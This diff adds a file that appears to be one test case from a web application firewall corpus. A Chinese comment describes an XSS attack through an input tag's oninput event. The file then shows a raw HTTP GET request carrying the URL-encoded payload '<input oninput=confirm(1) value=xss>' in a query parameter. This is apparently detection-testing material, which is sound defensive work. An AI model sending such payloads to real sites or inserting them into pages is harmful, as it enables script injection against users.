@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_常规_事件_input标签_oninput事件-06506519
+# 攻击者在网页中插入一个输入框，并将其 oninput 事件设置为确认框的弹出函数，当用户输入内容时，确认框会弹出并显示一个误导性的消息，让用户误认为输入的内容被成功提交。而实际上，弹出确认框的同时，恶意脚本已经在用户浏览器中执行了。需要改变里面的值后触发。
+GET /?id=%3Cinput%20oninput=confirm%281%29%20value=xss%3E&bid=hd_tag_m8mv26d0 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv26d0
+RM-PRO-Token: 1c1ce711d1d260b6c91f0411d936bb62
+RM-PRO-Time: 1742808582287
+User-Agent: curl/7.83.1
+
